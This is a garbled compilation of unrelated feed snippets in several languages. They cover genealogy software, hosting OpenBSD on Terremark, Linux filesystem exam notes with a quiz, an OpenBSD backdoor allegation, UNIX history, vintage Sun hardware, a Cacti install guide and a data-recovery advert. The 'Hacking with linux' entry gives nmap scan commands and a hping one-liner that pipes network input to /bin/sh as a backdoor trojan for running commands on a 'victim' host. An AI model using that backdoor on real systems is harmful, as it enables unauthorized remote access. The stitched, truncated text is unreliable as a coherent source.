Sistema Soundex: para generar los códigos estándar utilizados en genealogía, a fin de comparar nombres escritos y pronunciados de diferente forma de acuerdo al idioma.
Los Gramplets, son scripts adicionales que otorgan funcionalidades extras, al mejor estilo de los complementos de Firefox.


Vista Principal, bajo Linux 




Las Vistas son múltiples y muy variadas: Personas, Relaciones, Familias, Ancestros, Eventos, Lugares, Geografía (mapas), Fuentes, Repositorios, Objetos, Notas y Web (presenta nuestro árbol en línea si lo tenemos publicado).
Reportes. Dentro de los de estilo gráfico: línea de tiempo, estadísticos, gráfico de ancestros y descendientes, gráfico Fan (en semicírculo). Reportes de texto en formato PDF, RTF, LaTeX, texto y OpenDocument. Ver ejemplos.


Instalación en Windows
Comentábamos anteriormente que la instalación del programa bajo Windows, tiene ciertos detalles adicionales, aunque no complicados si se sigue un orden. Pueden descargar libremente el tutorial que hemos elaborado detallando los pasos a seguir. ¡Éxitos!

  <title><![CDATA[How to be a Cheap Whore with Terremark]]></title>
  <summary><![CDATA[Some time last year, the venerable Luke Kilpatrick invited me to crash the blogger lounge at VMworld, with the idea that I might do some networking which might get me a job.  At the time, I was living off the substantial largesse of the Employment Development Department of California, surfing a lot, and looking kinda scuzzy.  He encouraged me to shave and create business cards.  I ended up cooking one up on my iPad while some sort of virtualization webcast was filmed behind me.  This business card achieved its goal, which was to prevent anyone from remotely wanting to hire me.  This enabled me to surf more.  It took a chance encounter on StokeReport to get me a job, months later.  Here is the card I made:  Somehow I did not manage to pass myself off as an Influencer™ while bumming in the blogger lounge.  I did, however, ask if anyone knew of a VMware cloud host that I could use, and a few people recommended Terremark's vCloud Express.  See, I'd been looking forever for someone who could host an OpenBSD VM for me, and ec2/Virtuozzo/flavor of the week were not acceptable solutions.  This is all Theo's fault, by the way.  Theo de Raadt does not believe in virtualization.  I worship Theo de Raadt, but I am willing to part with him on this one point.  See, I want to host OpenBSD, cheaply, which entails virtualization, but OpenBSD will Not Be Paravirtualized, because Theo Fucking Said So.  Here is Theo being angry and dismissive of my needs:  What is a Certified Ethical Hacker to do?!?!  I guess I need to fully virtualize OpenBSD, which pretty much only VMware will let me do, since VMware isn't paravirtualization.  However, most online VMware hosts are Enterprise as Fuck®©™, which usually means they charge some ridiculous sum of money for hosting, require you to host Windows, and usually won't tell you what the service even costs until you've filled out some survey and requested a quote.  These people are not worth my time and energy and I hope they go out of business.  This Terremark lead sounded promising, so off I went and signed up for their services.  I hit some hitches in the signup process, for which the very nice Kenneth Denson credited me some free time.  Score one for Terremark! Here's the problem with Vcloud.  It's very Windows-centric.  The basic act of setting up my OpenBSD VM required me to use IE in Windows, running some proprietary ActiveX control, to be able to mount an ISO and access the virtual console.  There is, ostensibly, an XPI available for Firefox, but it doesn't work with any remotely recent version, and not at all on OS X.  I ended up using IE in Windows, inside VMware Fusion, to connect to VMware Vcloud Express and manipulate my VMware VM.  MY BRAIN IS MELTING FROM ALL THE VIRTUALIZATION!!!  I was trying to do this over 3G, too, since I didn't have home internet at the time.  Just the very act of mounting an ISO and trying to do an install from it was downright ridiculous.  I obviously needed some sort of Windows VM inside my Vcloud network from which to mount the ISO and do the install.  Terremark offers preconfigured Windows Server VMs, so I set up one of those using the bare minimum settings. I was able to successfully install OpenBSD, though it entailed quite a bit of frustration.  Here's why: Even on your Vcloud network, you still have to be VPNed into Terremark to access the console of your other serversThe VPN client will not launch if it detects that you are connected using RDPVMware's console is funny and tends to nondeterministically repeat keystrokes, which is very annoying when you're, say, installing OpenBSD and it asks you to enter a password, which does not echo.I could not solve the third problem there, but I solved the first two by installing a VNC server on Windows, then connecting to it over VNC instead of RDP.  The Cisco VPN software Terremark uses was too dumb to detect that I was connected over VNC, thank God, so it went ahead and connected. Even better, I could subsequently connect over RDP once the VPN connection was established. So, I got it working.  Unfortunately, those Windows Server VMs end up being quite expensive and I don't really want to keep one running for too long.  I've had one up and running for a few months, and Terremark has charged me nearly a Matuse for the privilege.  The long-term solution is to install Windows on a blank VM, using the absolute minimum of storage/RAM/CPU.  I happen to have a Windows XP license to use.  However, Windows XP does not like to install in Vcloud for a few reasons, most noteably because it doesn't include drivers for VMware's SCSI emulation.  Vcloud doesn't let you attach a virtual floppy to your Windows install.  The solution is to slip-stream a bunch of SCSI drivers into my Windows XP iso first.  I need the following four things: LSI 20320-R driversVMscsi floppy imageVirtual CloneDrive (to mount the ISO)nLite (for the slipstreaming)First off, I need to get the Windows XP iso onto my Windows Server VM.  When that's done, I use CloneDrive to mount it.  Following that, I open nLite, select "Drivers" and "Bootable ISO" options, add my drivers, and create my VMware-ready ISO.  The rest of the steps take place logged into Terremark from my Windows Server VM, where I create the image, mount the new ISO, install, and license!           The rest of the steps are truly horrifying, and involve me installing a few service packs, going through about 5 Windows Update cycles, installing VMware tools and, finally, logging into my new machine and using it to install OpenBSD. All this so I can save some L$$$$$$ and start saving up for that Matuse I know I deserve, like the Jew that I am:   L'chaim!]]></summary>

  <title><![CDATA[Hacking with linux (Top 5 tools)]]></title>
  <summary><![CDATA[Why Linux-Linux has many types of distribution like redhat, debian, slax etc. Source code of most of the linux is available, easy for application programming and easy to modify. Most of the versions are free of cost and server market share is increasing day by day .Linux is gaining popularity and is fast becoming a stable industry strength OS. 
 
Vulnerability scanner- These tool allow the attacker to connect to a target system and check for such vulnerabilities as configuration errors, default configuration settings that allow attackers access, and the mostrecently reported system vulnerabilities. The preferred open-source tool for this is Nessus. Nessus is anextremely powerful network scanner. It can also be configured to run a variety of attacks.http://www.nessus.org/nessus/intro.php 
 
Port scanner- Nmap is the best scanning tool for linux. www.insecure.org/nmap 
 
Stealth Scan, TCP SYN 
nmap -v -sS 192.168.0.0/24 
UDP Scan 
nmap -v -sU 192.168.0.0/24 
Stealth Scan, No Ping 
nmap -v -sS -P0 192.168.0.0/24 
Fingerprint 
nmap -v -O 192.168.0.0/24 #TCP 
 
 
 
Scanlogd - detects and logs TCP port scans. http://www.openwall.com/scanlogd/ 
Scanlogd only logs port scans. It does not prevent them. You will only receive summarized information in the 
system's log. 
Abacus Portsentry- http://www.psionic.com/abacus/portsentry/ 
Portscan detection daemon Portsentry has the ability to detect port scans (including stealth scans) on the 
network interfaces of your server. Upon alarm it can block the attacker via hosts.deny, dropped route or 
firewall rule. 
 
 
Hping- hping is a command-line oriented TCP/IP packet assembler/analyzer. The interface is inspired to the ping(8) unix command, but hping isn't only able to send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols, has a traceroute mode, the ability to send files between a covered channel, and many other features. More commonly known for its use as a pinging utility, HPing carries a hidden but handy usage, that is a Backdoor Trojan. 
Just enter the following command on your victim 
$ ./hping2 -I eth) -9ecc | /bin/sh 
Then Telnet into any port of your victim and invoke commands remotely on your victim's host by preceding 
any Unix/Linux commands with ecc 
$ telnet victim.com 80 
$ eccecho This Text imitates a trojan shovel 
"While hping was mainly used as a security tool in the past, it can be used in many ways by people that don't care about security to test networks and hosts. A subset of the stuff you can do using hping:Firewall testing
Advanced port scanning
Network testing, using different protocols, TOS, fragmentation
Manual path MTU discovery
Advanced traceroute, under all the supported protocols
Remote OS fingerprinting
Remote uptime guessing
TCP/IP stacks auditing
hping can also be useful to students that are learning TCP/IP.
Hping works on the following unix-like systems: Linux, FreeBSD, NetBSD, OpenBSD, Solaris, MacOs X, Windows. " From www.hping.org]]></summary>

  <title><![CDATA[Create partitions and filesystems  (weight: 2)]]></title>
  <summary><![CDATA[Candidates should be able to configure disk partitions and then create filesystems on media such
as hard disks. This includes the handling of swap partitions.

Use various mkfs commands to set up partitions and create various filesystems such as 

ext2, ext3, xfs, reiserfs v3, vfat

The following is a partial list of the used files, terms and utilities 

fdisk
mkfs
mkswap

Блочное устройство Блочное устройство представляет собой уровень абстракции, описывающий любое устройство хранения информации, которое может быть разбито на блоки определенного размера; доступ к каждому блоку осуществляется независимо от доступа к другим блокам. Такой доступ часто называют произвольным доступом. Типичные примеры блочных устройств: жёсткий диск, CD-ROM, флоппи-дисковод. 
Символьное устройство вид файла устройства в UNIX/Linux-системах, обеспечивающий интерфейс к устройству, реальному или воображаемому, с возможностью посимвольного обмена информацией.В отличие от блочного устройства символьное устройство, как правило, не обладает возможностями произвольного доступа. В большинстве своём, чтение и запись данных в символьное устройство не буферизуется. Типичные примеры символьных устройств: стриммер, модем, телетайп или терминал. 
 Блочные и символьные устройства Linux 

# ls -l  /dev/sda /dev/sdb  /dev/tty0
brw-rw---- 1 root disk 8,  0 Jan 18 12:26 /dev/sda
brw-rw---- 1 root disk 8, 16 Jan 18 12:26 /dev/sdb
crw--w---- 1 root root 4,  0 Jan 18 12:26 /dev/tty0

Первый символ b в строке указывает на блочное устройство. 
Первый символ c в строке указывает на символьное устройство. 
Разделы 
Для некоторых блочных устройств, таких как дискеты, CD и DVD- диски, принято использовать одну файловую систему на всем носителе. Однако на жестких дисках больших объемов и даже на небольших USB- накопителях доступное пространство принято делить или разбивать на несколько разделов. 
Вывод информации о разделах

Столбцы Start и End показывают начальный и конечный цилиндры для каждого раздела. 
Столбец Blocks показывает число блоков размером 1 килобайт (1024 байт) в разделе. Максимальное количество блоков в разделе, следовательно, равняется половине произведения числа цилиндров (End + 1 – Start) на число секторов в цилиндре. 
Поле Id указывает на предполагаемое использование раздела. 

Тип 82 – файл подкачки.
Тип 83 – раздел для хранения информации.

Существует около 100 различных типов томов.

Типы файловых систем 
Linux поддерживает несколько различных типов файловых систем. Каждая имеет свои достоинства, недостатки и отличительные черты. Важное свойство файловой системы – журналирование – позволяет быстро восстановить систему после сбоя. Как правило, журналируемые системы предпочтительнее нежурналируемых, если у вас есть выбор. Ниже приведен краткий обзор типов файловых систем, которые необходимо знать для экзамена LPI. 
ext2 
Файловая система ext2 (также известная как вторая расширенная файловая система) разработана для устранения недостатков в системе Minix, использовавшейся в ранних версиях Linux. Она широко использовалась в Linux в течение длительного времени. Ext2 не журналируется и в значительной степени вытеснена ext3. 
ext3 
Файловая система ext3 дополняет возможности стандартной ext2 журналированием и поэтому представляет собой эволюционное развитие очень стабильной файловой системы. Она обеспечивает разумную производительность в большинстве ситуаций и продолжает совершенствоваться. Поскольку она представляет собой расширенный вариант системы ext2, есть возможность преобразовывать систему ext2 в ext3 и, в случае необходимости, обратно. 
ext4 
Fourth Extended File System (четвёртая версия расширенной файловой системы), сокр. ext4, или ext4fs — журналируемая файловая система, используемая в ОС с ядром Linux. Основана на файловой системе ext3. 
Основной особенностью стало увеличение максимального объёма одного раздела диска до 1 эксабайта (260 байт) при размере блока 4Kb, и увеличение размера одного файла до 16 терабайт. Кроме того, в ext4 представлен механизм пространственной (extent) записи файлов (новая информация добавляется в конец заранее выделенной по соседству области файла), уменьшающий фрагментацию и повышающий производительность. В Ubuntu начиная с версии 9.10, ext4 стала ФС по умолчанию. Google переходит на ext4 
ReiserFS 
ReiserFS – это файловая система, основанная на B-дереве, с очень хорошими рабочими характеристиками, особенно для большого числа маленьких файлов. ReiserFS хорошо масштабируется и является журналируемой. 
ReiserFS4 
Reiser4 — 4-я версия журналируемой файловой системы ReiserFS, разработанной специально для Linux (хотя может использоваться и в других ОС) компанией Namesys под руководством Ганса Рейзера. Система представлена в 2004 году и включает в себя такие современные технологии как задержка выделения пространства, встроенную возможность кодирования и сжатия данных, транзакции. Несмотря на арест Ганса Рейзера и прекращения активности компании Namesys[1] разработка Reiser4 продолжается русским программистом Эдуардом Шишкиным. Интервью с разработчиком reiser4 Эдуардом Шишкиным. 
XFS 
XFS – журналируемая файловая система. Она имеет ряд эффективных функций и оптимизирована для масштабирования. XFS активно кэширует перемещаемую информацию в оперативной памяти, поэтому при использовании этой системы рекомендуется иметь источник бесперебойного питания. 
vfat 
Эта файловая система (также известная как FAT32) не является журналируемой и имеет множество недостатков по сравнению с файловыми системами, используемыми Linux. Она применяется для обмена данными между системами Windows и Linux, поскольку читается обеими. 
Создание файловых систем 
Для создания файловых систем в Linux используется команда mkfs. 
Для создания раздела подкачки – команда mkswap. 
Команда mkfs фактически является интерфейсом доступа к целому ряду команд, специфичных для конкретных файловых систем, например, mkfs.ext3 для ext3, mkfs.reiserfs для ReiserFS. 
Поддержка каких файловых систем имеется в вашей системе? 
Чтобы это выяснить, используйте команду ls /sbin/mk* 

# ls /sbin/mk*
/sbin/mkdosfs      /sbin/mkfs.ext3     /sbin/mkfs.reiserfs
/sbin/mke2fs       /sbin/mkfs.ext4     /sbin/mkfs.vfat
/sbin/mkfs         /sbin/mkfs.ext4dev  /sbin/mkfs.xfs
/sbin/mkfs.bfs     /sbin/mkfs.jfs      /sbin/mkhomedir_helper
/sbin/mkfs.btrfs   /sbin/mkfs.minix    /sbin/mkreiserfs
/sbin/mkfs.cramfs  /sbin/mkfs.msdos    /sbin/mkswap
/sbin/mkfs.ext2    /sbin/mkfs.ntfs

Создание файловой системы ext3

Полезная опция, используемая при создании ext2 и ext3 – опция -L с именем, которая назначает метку тому. Метку можно использовать при монтировании файловой системы вместо имени устройства; это обеспечивает определенный уровень изоляции в отношении изменений, который необходимо отразить в различных управляющих файлах. Для просмотра и установки метки на существующую систему ext2 или ext3 используется команда e2label. Длина метки ограничена 16 символами. 
Создание файловой системы ext4

Для задания метки тома в системе XFS используется опция -L с именем. Для добавления метки к существующей файловой системе XFS используется команда xfs_admin с опцией -L. Для просмотра метки используется команда xfs_admin с опцией -l. В отличие от ext2, ext3 и ReiserFS максимальное число символов в метке составляет 12. 
Создание файловой системы vfat 

# mkfs -t vfat /dev/sdb7
mkfs.vfat 3.0.9 (31 Jan 2010)

Метка тома в системе FAT32 назначается с помощью опции -n. Команда e2label отображает или устанавливает метку тома в системе vfat, а также в разделах ext. Длина метки ограничена 16 символами.

Вопросы LPI-I ( приблизительные ) 

1) Which of following commands can be used to create an ext2
A. ext2fs
B. mke2fs
C. mkfs.e2fs
D. mkfs.ext2


2) You run Linux’s fdisk and modify your partition layout. Before exiting the program, you
realize that you’ve been working on the wrong disk. What can you do to correct this problem?
A. Nothing; the damage is done, so you’ll have to recover data from a backup.
B. Type w to exit fdisk without saving changes to disk.
C. Type q to exit fdisk without saving changes to disk.
D. Type u repeatedly to undo the operations you’ve made in error.


3) What does the following command accomplish?
# mkfs -t ext2 /dev/sda4
A. It sets the partition table type code for /dev/sda4 to ext2.
B. It converts a FAT partition into an ext2fs partition without damaging the partition’s
existing files.
C. It creates a new ext2 filesystem on /dev/sda4, overwriting any existing filesystem
and data.
D. Nothing; the -t option isn’t valid, and so it causes mkfs to abort its operation.


4) Which of the following best summarizes the differences between DOS’s FDISK and
Linux’s fdisk?
A. Linux’s fdisk is a simple clone of DOS’s FDISK but written to work from Linux rather
than from DOS or Windows.
B. The two are completely independent programs that accomplish similar goals, although
Linux’s fdisk is more flexible.
C. DOS’s FDISK uses GUI controls, whereas Linux’s fdisk uses a command-line interface,
but they have similar functionality.
D. Despite their similar names, they’re completely different tools—DOS’s FDISK handles
disk partitioning, whereas Linux’s fdisk formats floppy disks.


5) What is an advantage of a journaling filesystem over a conventional (non-journaling)
filesystem?
A. Journaling filesystems are older and better tested than non-journaling filesystems.
B. Journaling filesystems never need to have their filesystems checked with fsck.
C. Journaling filesystems support Linux ownership and permissions; non-journaling filesystems don’t.
D. Journaling filesystems require shorter disk checks after a power failure or system crash.

Ответы 

1) The correct answer is B and D.
ext2 filesystem can be create with either mke2fs or mkfs.ext2 commands.


2) The correct answer is C. Linux’s fdisk doesn’t write changes to disk until
you exit the program by typing w.
Typing q exits without writing those changes, so typing q in this situation will avert disaster.
Typing w would be precisely the wrong thing to do.
Typing u would do nothing useful because it’s not an undo command.


3) The correct answer is C. The mkfs command creates a new filesystem,
overwriting any existing data and therefore making existing files inaccessible. This command
doesn’t set the partition type code in the partition table. The -t ext2 option tells mkfs to
create an ext2 filesystem; it’s a perfectly valid option.


4) The correct answer is B. Although they have similar names and purposes,
Linux’s fdisk isn’t modeled after DOS’s FDISK. DOS’s FDISK does not have GUI controls. Linux’s
fdisk does not format floppy disks.


5)  The correct answer is D. The journal of a journaling filesystem records pending operations,
resulting in quicker disk checks after an uncontrolled shutdown.Contrary to option A, journaling
filesystems are, as a class, newer than non-journaling filesystems; in fact, the journaling ext3fs
is built upon the non-journaling ext2fs. Although disk checks are quicker with journaling filesystems
than with non-journaling filesystems, journaling filesystems do have fsck utilities, and these may
still need to be run from time to time. All Linux native filesystems support Linux ownership and
permissions; this isn’t an advantage of journaling filesystems, contrary to option C.

  <title><![CDATA[El FBI acusado por Theo de Raadt, ¿backdoor en OpenBSD?]]></title>
  <summary><![CDATA[El fundador de OpenBSD,  Theo de Raadt señalo que hay  un potencial Backdoor en la  implementación de un stack IPSec  para establecer conexiones VPN. Otros  proyectos de código abierto que han adoptado dicho código también  podrían contener una puerta trasera. El Backboor  habría sido encontrado  en el código en el año 2000  y 2001 (!), cuando los desarrolladores de  OpenBSD habrían sido  presuntamente encargados por el gobierno de EE.UU.  para manipular el código.  El desarrollador de software  Gregorio Perry, quien dice ser un  ex-colaborador de OpenBSD, menciona  el nombre de Jason Wright, uno de  los desarrolladores que estarían involucrados. Wright es una de las  principales figuras de OpenBSD.  Según  Perry, esta también fue la razón por la cual el departamento  de defensa de EE.UU. de un momento a otro dejó de financiar el proyecto  OpenBSD a principios  de 2003. Al parecer, DARPA se enteró del Backdoor y  retiró su financiación. Sin  embargo, las denuncias de Perry van  incluso más allá, ya que también  afirma que el especialista en  virtualización Scott Lowe esta en la nómina del  FBI. Perry dijo que  Lowe ha estado promoviendo el uso de implementaciones en entornos  virtualizados de OpenBSD para VPN y firewall. Los desarrolladores de OpenBSD a veces se refieren a la seguridad como una  de las mayores prioridades del proyecto, referiendose a sus prácticas  de revisión de código a fondo y el proceso de auditoría pro-activa como  factores clave que contribuyen a la supuesta seguridad superior de la  plataforma. Si las acusaciones de Perry son ciertas, la  presencia de un Backdoor del FBI que habría pasado inadvertido durante  una década, serían una gran vergüenza para OpenBSD.  Desde que lo dijo Hugo Scolnik y lo denunció Andrew Fernandez,  la existencia de puertas traseras en el software privativo, era algo  más que una mera sospecha. Algunos gobiernos, conscientes del enorme  riesgo que podría suponer la existencia de puertas traseras en los  sistemas que contenían información sensible, decidieron tomar medidas  urgentes sin necesidad de esperar a más confirmaciones ni debates  estériles.  Uno de los primeros países que decidieron eliminar los productos  privativos de los sistemas con información sensible fue Alemania. Este  país, de forma inteligente y en un tiempo récord, eligió GNU/Linux  alternativa para los sistemas relacionados con Seguridad Nacional. Otros  países, allá por el año 2005, también mostraron su preocupación por la  posibilidad de que se pudiera acceder a la información contenida en sus  sistemas gubernamentales y algunos, como China, también tomaron medidas  para evitarlo. Pero lo más significativo y sorprendente de esta historia, es que  hasta los EEUU, conscientes de los posibles problemas de seguridad del  software privativo, también decidieron usar sistemas de fuentes abiertas  en algunos de sus sistemas sensibles y en especial, en aquellos  relacionados con la Defensa Nacional.

  <title><![CDATA[UNIX, GNU och Linux: historisk tillbakablick]]></title>
  <summary><![CDATA[Alla kommersiella försök att standardisera UNIX misslyckades. Ett framgångsrikt
projekt startades i början på 1980-talet vid MIT av Richard Matthew Stallman, gamla
epokens siste hackare: projektet GNU (GNU's Not Unix). Stallmans mål var att skriva
ett nytt UNIX-likande system from scratch. Tanken var att systemet skulle bli fritt
tillgängligt. Tack hans intensiva insats och andra programmerares bidrag uppstod fram
till slutet av 1990-talet en avsevärd och kraftfull samling av UNIX-verktyg. Själva
systemet har hittils inte blivit färdigt, men GNU-verktygen har etablerat sig på
många UNIX-varianter, bl a för att enstaka UNIX-leverantörer ville bygga ut sina
intäktskällor ännu mer. Med grundpaketet levererades t ex ingen
GNU C-kompilator. Sedan tog många systemadministratörer, för att
spara pengar, Stallmans GNU C-kompilator som egentligen var kvalitativt bättre. Så
blev GNU-verktygen til en systemövergripande quasi-standard. Den fria
utvecklingsmetoden lyckades komma ett steg vidare än de proprietära
standardiseringsförsöken.
 
 
Intressant: När Stallman tog beslutet att starta GNU, hade han aldrig tidigare
arbetat med UNIX och inte skrivit en enda rad C-kod. Allt han visste var ett par
grundläggande koncept och faktumet att UNIX hade bevisat sitt plattformoberoende.
 
 
Även på den akademiska sidan mötte man allt oftare UNIX-leverantörernas slutna
hållning: i början ställde AT&T källkoden till universitetens förfogande och koden
kunde därmed användas som undervisnings- och forskningsmaterial. När AT&T stängde
källkoden försvann den här möjligheten. Andrew S. Tanenbaum, informatikprofessor vid
Amsterdams universitet, bestämde sig därför för att skriva en egen version av UNIX
som inte hade något att göra med AT&T:s upphovsrättsskyddade kod.  Efter två års slit
publicerade han sitt system som fick namnet Minix. Systemet var tänkt inte som något
praktiskt användbart verktyg, utan framför allt som lärobjekt. Trots detta användes
Minix av väldigt många studenter på hemdatorer för att det var tillgängligt till ett
skäligt pris, till skillnad från de kommersiella UNIX-varianterna. I det här
användningsområdet nådde Minix väldigt fort sina gränser. Många Minix-användare
lämnade utvecklingsförslag till Tanenbaum och skickade sina patcher med tillägg och
förbättringar. Tanenbaum var dock mycket tillbakahållen med detta. Han såg Minix
framför allt som tutorial och strävade snarare efter en koncis och tydlig struktur än
någon omfattande funktionalitet.
 
 
En Minix-användare vid namn Linus Torvalds nöjde sig inte med detta. Allt förutom
kärnan i GNU-systemet var färdigt. En release av GNU-kärnan som hette HURD verkade
vara en avlägsen händelse. För att fylla den här tidsluckan började Linus Trovalds
skriva en egen kärna som väldigt fort spreds under namnet Linux och bildade en stor
community av användare och utvecklare. De flesta utvecklarna jobbade på
UNIX-varianter där GNU-verktygen fanns. Därför var det naturligt att gestalta
Linux-kärnan på ett sådant sätt att den skulle kunna användas tillsammans med
GNU-verktygen: GNU/Linux. Kärnan HURD har hittills inte övervunnit sitt tidiga
"akademiska" utvecklickngsstadium och Linux, som i början var tänkt som något
provisoriskt, har etablerat sig på HURD:s plats.
 
 
Samtidigt befriades BSD från sitt ursprungliga beroende av AT&T: en grupp
BSD-utvecklare ersatte alla anvisningar i källkoden, som fortfarande styrdes till en
stor del av AT&T, med nya och i ett långvarigt mål erövrade frihet för BSD. Det blev
början till en mängd projekt såsom FreeBSD, NetBSD och OpenBSD som också fann en
betydlig popularitet. De här projekten kallas ibland för Linux syskon (och många
Linux-distributioner innehåller ibland något läckert från de här operativsystemen).
 
 
Sedan dess har Linux utvecklats till en betydande UNIX-variant: kommerisella
UNIX-leverantörer förlorade marknadsandelar till fördel för Linux och fick utveckla nya
strategier. Ofta mynnade deras nya idéer ut i att leverera stödtjänster för Linux
vars vidare spridning inte längre kunde förhindras.
 
 
UNIX (särskilt dess fria versioner) är idag en stabil aktör på servermarknaden. En av
de mest spännande frågorna idag är vilken potential UNIX har i desktop-segmentet.

  <title><![CDATA[Streching the EOL on old hardware.]]></title>
  <summary><![CDATA[A couple of weeks ago a friends from work was clearing out their place, I assume she had something to do with it, but in any case my collection of computers grew a bit when he offered to gift them to me. So now I own a Sun SPARCstation 5 and a  Sun SparcStation IPX  along with other bits and bobs.  Now as a rule I only take systems that work, and they do, however the passwords have been lost in the annals of time.  
So I was left with a marginal SparcStation 5 with a missing CD drive, which booted to Solaris 2.7, but no further. But I’m a geek, and undaunted by this minor setback, I set out looking for a workaround. The googling net is full of solutions for password recovery … if you have a bootable cd (yes CD not DVD), Ok, next does eBay still have Solaris stuff that old … not cheaply, so what next.  
While googling, OpenBSD presented itself, and I downloaded and burned some generic ISO’s of version 4.8. and then to solve the other hardware issue, the Sun IPX was delivered with a cartridge loading CD, but the IPX drive was housed in an external SCSI 1 case, and the SS5 was wired with a SCSI II system externally. so I dismantled the CD drive and searched for a CD cartridge carrier which as any self-respecting Geek, I had stashed away for a rainy day. Then armed with the hardware I jumpered the SCSI CD drive into the SS5 chassis, and bingo a complete and bootable SS5.  
Now attempting to boot the OpenBSD was no problem, which surprised me to no end. But then I attempted a password recovery on the Solaris disk and no joy. but I did manage to mount it, and more or less destroy it (latter I found a way to fix it) and determined to go ahead and install the full OpenBSD system. Which more or less worked, there were issues with the X-Fonts archive but I found the tarball contained another version, which worked. It now booted on the internal disk, but I had to add and modify the XF86Config file to find the display, mouse and keyboard. My result does not match the examples of this file you might find on the net. So if you are interested, contact me, the Sun GB keyboard was hell to make work.  but TADA: 
 
 
And I even now have a browser in the form of Links  
 
However, while it can compile most anything, there isn’t much left on the 1GB disk to compile TO. So unless I find some pre-compiled SMALL binaries, or a very cheap internal SCSI Disk to upgrade with, I’m stuck.  
There may be more coming for this system, but just to make a comparison with modern hardware; 


 
 SparcStation 5 
Nokia N900 smartphone


Screen 
 1024 x 768 (9 screens)
 800 x 480 (4 screens)


Memory 
 64 MBytes 
 256 MBytes 


CPU Freq
 110 Mhz 
 600 Mhz 


Storage 
 1 GByte 
 32 Gbyte 


Price (new) 
 8,000.00$ to 10,000.00$ 
 ~500.00$ 


UPDATE: I found amongst the archives another external 1.2GB SCSI disk, which fits nicely in the same connector that the CD-Drive was in, so now the SS5 is without the CD-Drive but has a massive 2.2GB of disks, Impressive]]></summary>

  <summary><![CDATA[I've updated Yaifo to 4.8 to go with OpenBSD 4.8.  It can be downloaded from Sourceforge.  I've tested macppc, i386, and amd64.  I'm having an issue with sparc64 and have not yet tested sgi, alpha, or landisk (which I'm pretty sure doesn't build yet).  sparc64 works, it just prints out an error message every few seconds.  If someone wants to submit a patch, I can commit it and release a 4.8.1 or something.  Please subscribe to the mailing list and submit any test reports, diffs, suggestions.  Thanks.  Oh, and Yaifo HEAD is now sync'd with OpenBSD -current (as of 2010-11-28).]]></summary>

  <summary><![CDATA[This is the step for installing cacti on openbsd.I`m use OpenBSD 4.7 on VMWare Workstation 7 in Windows Desktop.   1. instal the package Set the package PATH #export PKG_PATH=ftp://ftp.openbsd.org/pub/OpenBSD/4.7/packages/i386/      Package needed for OpenBSD :   rrdtoolapache-httpdnet-snmpmysql-serverphp5-corephp5-mysqlphp5-snmp  Instal following package (ports) needed for OpenBSD  #pkg_add rrdtool net-snmp php5-core php5-snmp apache-httpd  Instal MYSQL-SERVER # pkg_add mysql-server   Create the Default Database  # /usr/local/bin/mysql_install_db  Start the database server  # /usr/local/bin/mysqld_safe >/dev/null 2>&1 &  Set the passwords  #/usr/local/bin/mysqladmin -u root password 'new-password'  You should replace "new-password" with an actual one.  Instal PHP # pkg_add php5-mysql   This will automatically backtrack and install PHP5 itself.   Then ...   # ln -s /var/www/conf/modules.sample/php5.conf /var/www/conf/modules   # ln -fs /var/www/conf/php5.sample/mysql.ini /var/www/conf/php5/mysql.ini   Then you have to modify /var/www/htdocs/httpd.conf   to include php files as usable index files Apache.  In /var/www/conf/httpd.conf, enter, find where it says:   DirectoryIndex index.html   And change it to   DirectoryIndex index.html index.php   and uncomment the following line:   AddType application/x-httpd-php .php  Instal PHPMYADMIN # pkg_add -v phpMyAdmin   The the soft links-  # ln -fs /var/www/conf/php5.sample/gd.ini /var/www/conf/php5/gd.ini   # ln -fs /var/www/conf/php5.sample/mbstring.ini  /var/www/conf/php5/mbstring.ini   # ln -fs /var/www/conf/php5.sample/mcrypt.ini /var/www/conf/php5/mcrypt.ini   # ln -fs /var/www/conf/php5.sample/mysql.ini /var/www/conf/php5/mysql.ini   # ln -s /var/www/phpMyAdmin/ /var/www/htdocs/phpmyadmin   Edit the /var/www/phpMyAdmin/config.inc.php file   so that the blowfish secret is set to whatever you want,  and the username and password for the server are set   to whatever you configured for access in the MySQL installation.  This will also act as the authentication into phpMyAdmin as well.  Then restart Apache. 2. Starting the apache  # apachectl start  if you want to verify that php is actually working after getting apache running:  Open http://yourserver ip/ in your favorite web browser. 3. Install cacti download cacti from http://cactiusers.org/downloads/  # cd /var/www # ftp -a http://www.cacti.net/downloads/cacti-0.8.7g.tar.gz # tar -xzvf cacti-0.8.7g.tar.gz  Add a couple useful links for the inevitable, if infrequent, update:  # cd /var/www # ln -s cacti-0.8.7g cacti # cd /var/www/htdocs # ln -s ../cacti cacti 4.

Empowered by the new unique data recovery technologies, it is the most comprehensive data recovery solution for recovery files from FAT12/16/32, NTFS, NTFS5 (created or updated by Windows 2000/XP/2003/Vista), HFS/HFS (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2FS/Ext3FS (Linux) partitions. It functions on local and network disks, even if such parti!
 tions are formatted, damaged or deleted. Flexible parameter settings give you absolute control over data recovery.   This utility recovers files from FAT (FAT12, FAT16, FAT32), NTFS, NTFS5 (created or updated by Windows 2000/2003/XP/Vista), HFS/HFS (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2FS/Ext3FS (Linux) partitions on local hard disks. For demonstration of network capabilities R-STUDIO recover files less than 64KB from remote FAT, NTFS/NTFS5, HFS/HFS , UFS1/UFS2 (Little and Big Endian variants) and Ext2FS/Ext3FS disks.    R-Studio utilities recover files   Deleted without Recycle Bin, or when Recycle Bin has been emptied;   Removed by virus attack or power failure;   After the partition with the files was reformatted, even for different file system;   When the partition structure on a hard disk was changed or damaged. In this case, R-Studio utilities can scan the hard disk try!
 ing to find previously existed partitions and recover files fr!
 om found
 partitions.   From hard disk with bad sectors. R-Studio Data Recovery Software can first copy the entire disk or its part into an image file and then process such image file. This is especially useful when new bad sectors are constantly appearing on the hard disk, and remaining information must be immediately saved.    New R-Studio features in version 4.x   Versatile data visualisation. R-Studio can show data on disk either as a real folders/files structure or as files sorted by their extensions, or Creation/Last Accessed/Modification times.   Expandable Known File Types. New file signatures can be added to the list of known file types by the end user.   Support for mass file recovery R-Studio can automatically apply data recovery options for all files to recover.   Common Find/Mark dialog. R-Studio can automatically find and mark multiple files matching search options specified on the Find/Mark dialog.   Hex Editor Enhancement. Files!
